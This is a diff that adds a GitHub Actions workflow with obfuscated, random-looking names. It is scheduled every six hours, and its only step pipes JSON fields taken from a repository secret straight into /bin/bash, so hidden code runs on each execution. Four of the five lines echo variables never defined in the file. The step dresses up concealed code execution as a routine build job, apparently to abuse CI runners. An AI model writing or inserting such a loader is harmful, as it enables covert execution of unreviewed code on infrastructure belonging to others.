@@ -1,0 +1,21 @@
+name: hexinsharendaozhik
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hexinsharendaozhik
+        env:
+          vfhig84505: ${{ secrets.vfhig84505 }}
+        run: |
+          echo $vfhig84505 | jq -r .lvsxg6 | /bin/bash
+          echo $ox69 | jq -r .zd1198 | /bin/bash
+          echo $dz76 | jq -r .ctw986 | /bin/bash
+          echo $eq55177 | jq -r .shgvw4 | /bin/bash
+          echo $dwonf4 | jq -r .ghtjv079 | /bin/bash
+
